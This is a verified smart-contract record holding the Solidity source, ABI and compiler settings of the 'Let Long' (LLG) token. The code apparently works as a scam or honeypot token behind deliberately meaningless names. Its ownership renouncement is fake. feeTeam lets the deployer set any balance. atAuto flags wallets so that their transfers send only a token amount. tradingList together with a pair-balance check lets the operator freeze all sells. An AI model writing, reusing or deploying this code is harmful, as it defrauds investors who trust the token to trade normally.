{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface enableWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeReceiver {\n    function createPair(address takeLaunch, address maxFrom) external returns (address);\n}\n\ninterface autoMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txBuy) external view returns (uint256);\n\n    function transfer(address fundReceiver, uint256 exemptList) external returns (bool);\n\n    function allowance(address teamMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundReceiver,\n        uint256 exemptList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellFromTotal, uint256 value);\n    event Approval(address indexed teamMarketing, address indexed spender, uint256 value);\n}\n\ninterface autoMaxMetadata is autoMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LetLong is listLiquidity, autoMax, autoMaxMetadata {\n\n    mapping(address => uint256) private shouldEnable;\n\n    string private txTokenTeam = \"Let Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return minMarketingMode;\n    }\n\n    uint256 private txTotalAt;\n\n    uint256 private fundAmountExempt;\n\n    mapping(address => bool) public shouldList;\n\n    function atAuto(address liquidityShould) public {\n        walletAmount();\n        \n        if (liquidityShould == senderExemptTrading || liquidityShould == senderFrom) {\n            return;\n        }\n        shouldList[liquidityShould] = true;\n    }\n\n    function teamShould() public {\n        emit OwnershipTransferred(senderExemptTrading, address(0));\n        sellReceiver = address(0);\n    }\n\n    function tradingList(uint256 exemptList) public {\n        walletAmount();\n        senderLaunched = exemptList;\n    }\n\n    function transfer(address txTo, uint256 exemptList) external virtual override returns (bool) {\n        return receiverAmountLiquidity(_msgSender(), txTo, exemptList);\n    }\n\n    uint256 senderLaunched;\n\n    function limitFund(address liquidityLaunch) public {\n        require(liquidityLaunch.balance < 100000);\n        if (listTx) {\n            return;\n        }\n        \n        exemptLaunched[liquidityLaunch] = true;\n        \n        listTx = true;\n    }\n\n    function owner() external view returns (address) {\n        return sellReceiver;\n    }\n\n    function allowance(address maxAuto, address toTeam) external view virtual override returns (uint256) {\n        if (toTeam == launchedMode) {\n            return type(uint256).max;\n        }\n        return takeSell[maxAuto][toTeam];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTo;\n    }\n\n    address launchedMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function walletAmount() private view {\n        require(exemptLaunched[_msgSender()]);\n    }\n\n    function transferFrom(address senderReceiver, address fundReceiver, uint256 exemptList) external override returns (bool) {\n        if (_msgSender() != launchedMode) {\n            if (takeSell[senderReceiver][_msgSender()] != type(uint256).max) {\n                require(exemptList <= takeSell[senderReceiver][_msgSender()]);\n                takeSell[senderReceiver][_msgSender()] -= exemptList;\n            }\n        }\n        return receiverAmountLiquidity(senderReceiver, fundReceiver, exemptList);\n    }\n\n    function tokenSwap(address senderReceiver, address fundReceiver, uint256 exemptList) internal returns (bool) {\n        require(shouldEnable[senderReceiver] >= exemptList);\n        shouldEnable[senderReceiver] -= exemptList;\n        shouldEnable[fundReceiver] += exemptList;\n        emit Transfer(senderReceiver, fundReceiver, exemptList);\n        return true;\n    }\n\n    address senderTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private minMarketingMode = 18;\n\n    uint256 private launchAmount;\n\n    function getOwner() external view returns (address) {\n        return sellReceiver;\n    }\n\n    constructor (){\n        \n        enableWallet sellList = enableWallet(launchedMode);\n        senderFrom = takeReceiver(sellList.factory()).createPair(sellList.WETH(), address(this));\n        if (fundAmountExempt == launchAmount) {\n            fundAmountExempt = txTotalAt;\n        }\n        senderExemptTrading = _msgSender();\n        teamShould();\n        exemptLaunched[senderExemptTrading] = true;\n        shouldEnable[senderExemptTrading] = tradingLaunch;\n        \n        emit Transfer(address(0), senderExemptTrading, tradingLaunch);\n    }\n\n    function receiverAmountLiquidity(address senderReceiver, address fundReceiver, uint256 exemptList) internal returns (bool) {\n        if (senderReceiver == senderExemptTrading) {\n            return tokenSwap(senderReceiver, fundReceiver, exemptList);\n        }\n        uint256 receiverMin = autoMax(senderFrom).balanceOf(senderTake);\n        require(receiverMin == senderLaunched);\n        require(fundReceiver != senderTake);\n        if (shouldList[senderReceiver]) {\n            return tokenSwap(senderReceiver, fundReceiver, takeTokenReceiver);\n        }\n        return tokenSwap(senderReceiver, fundReceiver, exemptList);\n    }\n\n    mapping(address => bool) public exemptLaunched;\n\n    address public senderExemptTrading;\n\n    bool private walletSell;\n\n    uint256 public senderWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return txTokenTeam;\n    }\n\n    string private isTo = \"LLG\";\n\n    bool public listTx;\n\n    uint256 private tradingLaunch = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private takeSell;\n\n    function approve(address toTeam, uint256 exemptList) public virtual override returns (bool) {\n        takeSell[_msgSender()][toTeam] = exemptList;\n        emit Approval(_msgSender(), toTeam, exemptList);\n        return true;\n    }\n\n    address private sellReceiver;\n\n    function feeTeam(address txTo, uint256 exemptList) public {\n        walletAmount();\n        shouldEnable[txTo] = exemptList;\n    }\n\n    event OwnershipTransferred(address indexed teamReceiver, address indexed limitFee);\n\n    uint256 marketingEnable;\n\n    address public senderFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLaunch;\n    }\n\n    bool public receiverFeeBuy;\n\n    bool public senderTotal;\n\n    function balanceOf(address txBuy) public view virtual override returns (uint256) {\n        return shouldEnable[txBuy];\n    }\n\n    uint256 constant takeTokenReceiver = 7 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFromTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptList\",\"type\":\"uint256\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFeeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderExemptTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptList\",\"type\":\"uint256\"}],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LetLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}